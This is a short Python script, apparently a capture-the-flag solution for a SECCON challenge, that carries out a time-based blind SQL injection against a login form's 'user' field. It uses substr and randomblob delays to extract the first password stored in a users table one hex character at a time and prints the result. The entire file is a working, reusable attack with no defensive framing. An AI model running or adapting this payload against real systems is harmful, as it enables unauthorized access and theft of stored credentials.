#!/usr/bin/env python

import requests
import time

RESULT = ""

def sqli(url, num, char, delay):
    data = {
        "user": "test' or substr((select password from users limit 1 offset 0),%d,1)='%s' and randomblob(%d00000000) and 'a'='a" % (num, char, delay),
        "pass": "password",
        "login": "Login"
    }

    start = time.time()
    res = requests.post(url, data=data)
    ellapse = time.time() - start

    if(ellapse > delay):
        return True
    else:
        return False

def main():
    global RESULT
    target = "http://sqlsrf.pwn.seccon.jp/sqlsrf/index.cgi"
    sourcestr = '1234567890abcdef'
    interval = 1
    idx = 0

    while True:
        print("[*] CURRENT RESULT: %s" % RESULT)
        idx += 1

        if(sqli(target, idx, "", interval)):
            break
        else:
            pass

        for x in sourcestr:
            print("[*] Test: %s" % x)

            if(sqli(target, idx, x, interval)):
                print("[+] HIT: %s" % x)
                RESULT += x
                break
            else:
                pass

    print("[+] FINAL RESULT: %s" % RESULT)

if __name__ == '__main__':
    main()
